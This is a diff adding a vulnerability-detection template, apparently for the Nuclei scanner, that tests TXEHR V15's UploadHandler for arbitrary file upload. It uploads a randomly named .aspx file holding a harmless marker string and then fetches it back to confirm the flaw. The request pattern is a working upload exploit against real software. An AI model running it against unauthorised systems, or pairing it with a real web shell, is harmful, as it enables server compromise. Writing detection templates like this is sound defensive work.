@@ -1,0 +1,48 @@
+id: poc-yaml-tosharesoft-uploadhandler-anyfile-upload
+info:
+  name: TXEHR V15 UploadHandler Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Arbitrary file upload vulnerability in TXEHR V15 UploadHandler. This allows attackers to upload malicious files to the server.
+
+variables:
+  t1: '{{rand_base(4)}}'
+  t2: '{{base64(t1)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Handler/UploadHandler.ashx?folder=Uploadfile2"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------123
+    body: |-
+      -----------------------------123
+      Content-Disposition: form-data; name="Filedata"; filename="{{t1}}.aspx"
+      Content-Type: text/plain
+
+      {{t2}}
+      -----------------------------123--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Handler/Uploadfile2/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
